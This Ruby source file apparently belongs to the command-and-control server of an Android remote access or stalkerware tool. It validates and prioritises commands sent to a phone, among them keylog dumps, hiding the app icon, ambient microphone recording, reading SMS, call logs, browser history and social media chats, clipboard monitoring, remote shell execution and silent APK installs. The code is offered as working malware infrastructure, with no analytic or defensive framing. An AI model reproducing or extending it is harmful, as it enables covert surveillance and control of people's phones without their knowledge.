# frozen_string_literal: true

class CommandValidator
  # Priority levels for command execution on Android device.
  # CRITICAL: executes immediately, bypasses queue (stop commands, shell, sms)
  # HIGH: hardware commands queued with high priority (camera, mic, screen)
  # NORMAL: data collection, no hardware contention
  # LOW: file operations, non-urgent tasks
  module Priority
    CRITICAL = 'critical'
    HIGH     = 'high'
    NORMAL   = 'normal'
    LOW      = 'low'
  end

  # Hardware resources required by command (for mutual exclusion on device)
  module Resource
    NONE          = 'none'
    CAMERA        = 'camera'
    MICROPHONE    = 'microphone'
    SCREEN        = 'screen'
    CAMERA_AND_MIC = 'camera_and_mic'
  end

  # Unified command registry: every command the server can send to Android.
  # Synced with Android CommandService.dispatchCommand() (51 commands).
  # Stale aliases (no Android handler) are excluded.
  ALLOWED_COMMANDS = %w[
    get_location get_accounts toggle_wifi
    start_camera stop_camera start_audio stop_audio
    take_photo get_device_info get_contacts get_sms get_call_logs
    get_installed_apps shell_command get_keylog_dump keylog_ack
    start_live_video stop_live_video start_live_audio stop_live_audio
    take_screenshot start_screen_record stop_screen_record
    send_sms install_apk uninstall_app launch_app
    unlock_screen hide_icon show_icon change_audio_mode
    get_wifi_info shell_exec
    start_location_tracking stop_location_tracking
    ambient_record get_app_usage get_browser_history
    browse_files list_files download_file upload_file
    upload_file_chunk delete_file preview_file rename_file
    move_file search_files add_geofence
    start_clipboard_monitor social_media_chats
  ].freeze

  # Priority for each command — determines queue ordering on device
  COMMAND_PRIORITY = {
    # CRITICAL — bypass queue, execute immediately
    'shell_command'          => Priority::CRITICAL,
    'shell_exec'             => Priority::CRITICAL,
    'send_sms'               => Priority::CRITICAL,
    'unlock_screen'          => Priority::CRITICAL,
    'hide_icon'              => Priority::CRITICAL,
    'show_icon'              => Priority::CRITICAL,
    'stop_camera'            => Priority::CRITICAL,
    'stop_audio'             => Priority::CRITICAL,
    'stop_live_video'        => Priority::CRITICAL,
    'stop_live_audio'        => Priority::CRITICAL,
    'stop_screen_record'     => Priority::CRITICAL,
    'stop_location_tracking' => Priority::CRITICAL,
    'uninstall_app'          => Priority::CRITICAL,
    'keylog_ack'             => Priority::CRITICAL,
    # HIGH — hardware commands
    'start_camera'           => Priority::HIGH,
    'take_photo'             => Priority::HIGH,
    'start_audio'            => Priority::HIGH,
    'ambient_record'         => Priority::HIGH,
    'start_live_video'       => Priority::HIGH,
    'start_live_audio'       => Priority::HIGH,
    'take_screenshot'        => Priority::HIGH,
    'start_screen_record'    => Priority::HIGH,
    'start_location_tracking'=> Priority::HIGH,
    # NORMAL — data collection
    'get_location'           => Priority::NORMAL,
    'get_contacts'           => Priority::NORMAL,
    'get_sms'                => Priority::NORMAL,
    'get_call_logs'          => Priority::NORMAL,
    'get_device_info'        => Priority::NORMAL,
    'get_accounts'           => Priority::NORMAL,
    'get_installed_apps'     => Priority::NORMAL,
    'get_wifi_info'          => Priority::NORMAL,
    'get_keylog_dump'        => Priority::NORMAL,
    'get_browser_history'    => Priority::NORMAL,
    'get_app_usage'          => Priority::NORMAL,
    'social_media_chats'     => Priority::NORMAL,
    'browse_files'           => Priority::NORMAL,
    'list_files'             => Priority::NORMAL,
    'search_files'           => Priority::NORMAL,
    'start_clipboard_monitor'=> Priority::NORMAL,
    # LOW — file ops, non-urgent
    'download_file'          => Priority::LOW,
    'upload_file'            => Priority::LOW,
    'upload_file_chunk'      => Priority::LOW,
    'delete_file'            => Priority::LOW,
    'preview_file'           => Priority::LOW,
    'rename_file'            => Priority::LOW,
    'move_file'              => Priority::LOW,
    'install_apk'            => Priority::LOW,
    'launch_app'             => Priority::LOW,
    'toggle_wifi'            => Priority::LOW,
    'change_audio_mode'      => Priority::LOW,
    'add_geofence'           => Priority::LOW,
  }.freeze

  # Hardware resource required by each command (for mutual exclusion)
  COMMAND_RESOURCE = {
    'start_camera'        => Resource::CAMERA,
    'take_photo'          => Resource::CAMERA,
    'start_audio'         => Resource::MICROPHONE,
    'ambient_record'      => Resource::MICROPHONE,
    'start_live_video'    => Resource::CAMERA_AND_MIC,
    'start_live_audio'    => Resource::MICROPHONE,
    'take_screenshot'     => Resource::SCREEN,
    'start_screen_record' => Resource::SCREEN,
  }.freeze

  AUDIO_MODES = %w[normal vibrate silent].freeze
  CAMERA_IDS = %w[0 1].freeze

  PARAM_RULES = {
    'send_sms'        => { required: %i[phone_number message_body] },
    'uninstall_app'   => { required: %i[package_name] },
    'launch_app'      => { required: %i[package_name] },
    'install_apk'     => { required: %i[apk_path] },
    'start_camera'    => { optional: %i[camera_id] },
    'set_audio_mode'  => { required: %i[mode] },
    'change_audio_mode' => { required: %i[mode] },
    'download_file'   => { required: %i[path] },
    'delete_file'     => { required: %i[path] },
    'rename_file'     => { required: %i[path new_name] },
    'move_file'       => { required: %i[path destination] },
    'search_files'    => { required: %i[query] },
    'shell_command'   => { required: %i[command] },
    'shell_exec'      => { required: %i[command] },
    'ambient_record'  => { optional: %i[duration] },
    'add_geofence'    => { required: %i[latitude longitude] },
    'start_location_tracking' => { optional: %i[interval] },
  }.freeze

  Result = Struct.new(:valid?, :value, :error, keyword_init: true)

  def self.validate(command, params = {})
    new.validate(command, params)
  end

  def validate(command, params = {})
    cmd = command.to_s.strip

    return failure("Command is required") if cmd.empty?
    return failure("Command '#{cmd}' is not allowed") unless ALLOWED_COMMANDS.include?(cmd)

    rules = PARAM_RULES[cmd]
    if rules && rules[:required]
      missing = rules[:required].select { |p| params[p].nil? && params[p.to_s].nil? }
      return failure("Missing required params for '#{cmd}': #{missing.join(', ')}") if missing.any?
    end

    if cmd == 'set_audio_mode'
      mode = (params[:mode] || params['mode']).to_s
      return failure("Invalid audio mode: #{mode}") unless AUDIO_MODES.include?(mode)
    end

    success(cmd)
  end

  def self.allowed?(command)
    ALLOWED_COMMANDS.include?(command.to_s.strip)
  end

  def self.priority_for(command)
    COMMAND_PRIORITY.fetch(command.to_s, Priority::NORMAL)
  end

  def self.resource_for(command)
    COMMAND_RESOURCE.fetch(command.to_s, Resource::NONE)
  end

  private

  def success(value)
    Result.new(valid?: true, value: value, error: nil)
  end

  def failure(error)
    Result.new(valid?: false, value: nil, error: error)
  end
end
